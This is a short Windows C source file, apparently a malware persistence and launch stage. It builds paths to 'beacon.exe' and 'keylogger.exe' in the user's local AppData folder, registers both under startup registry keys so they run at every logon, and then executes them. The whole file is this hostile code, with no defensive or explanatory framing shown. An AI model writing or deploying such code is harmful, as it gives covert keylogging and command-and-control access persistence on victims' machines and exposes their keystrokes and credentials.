#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winbase.h>
#include "helpers.h"


int main() {
    const size_t bufferLen = 500;
    char *localAppdataPath = getenv("LOCALAPPDATA");
    char beacon_path[bufferLen];
    char keylogger_path[bufferLen];
    snprintf(beacon_path, bufferLen, "%s\\beacon.exe", localAppdataPath);
    snprintf(keylogger_path, bufferLen, "%s\\keylogger.exe", localAppdataPath);
    int return_val;

    write_to_startup_regkey("beacon", beacon_path);
    write_to_startup_regkey("keylogger", keylogger_path);

    return_val = run_command(beacon_path);
    if (return_val != 0) {
        return return_val;
    }
    return run_command(keylogger_path);
}